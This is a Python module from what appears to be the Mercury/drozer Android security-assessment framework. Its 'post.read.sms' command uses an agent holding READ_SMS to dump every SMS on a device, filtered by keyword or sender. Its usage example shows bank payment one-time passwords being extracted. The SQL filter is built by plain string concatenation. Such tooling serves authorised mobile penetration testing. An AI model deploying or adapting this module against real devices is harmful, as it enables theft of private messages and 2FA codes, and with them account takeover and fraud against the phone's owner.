from mwr.droidhg.modules import common, Module

class SMS(Module, common.Provider, common.TableFormatter, common.FileSystem, common.ClassLoader):

    name = "Read all SMS messages"
    description = "Read all SMS messages from content://sms or filter by keywords or cellphone numbers. Relies on the agent having the READ_SMS permission."
    examples = """
mercury> run post.read.sms -f otp
| body                             | date_sent     | address      | person |
| Fakey Bank. Payment OTP 1d5gv578 | 1366708779000 | +27731356743 | null   |
| Fakey Bank. Payment OTP a4g6h8jk | 1366708795000 | +27731356743 | null   | 
"""
    author = "Tyrone (@mwrlabs)"
    date = "2013-04-23"
    license = "MWR Code License"
    path = ["post", "read"]
    
    def add_arguments(self, parser):
        parser.add_argument("-f", "--filter", default=None, help="filter results by a keyword")

    def execute(self, arguments):
        
        # Check that the agent has the READ_SMS permission
        packageManager = self.getContext().getPackageManager()
        if not packageManager.checkPermission("android.permission.READ_SMS", self.getContext().getPackageName()) == packageManager.PERMISSION_GRANTED:
            self.stdout.write("[-] This agent does not have the READ_SMS permission. Exiting...\n")
            return
        
        selection = None
        if arguments.filter != None:
            selection = "body like '%" + arguments.filter + "%' or address like '%" + arguments.filter + "%'"
        
        c = self.contentResolver().query("content://sms", {"address", "person", "date_sent", "body"}, selection, None, "date_sent ASC")

        if c != None:
            rows = self.getResultSet(c)
            self.print_table(rows, show_headers=True, vertical=False)
        else:
            self.stdout.write("Unknown Error.\n\n")
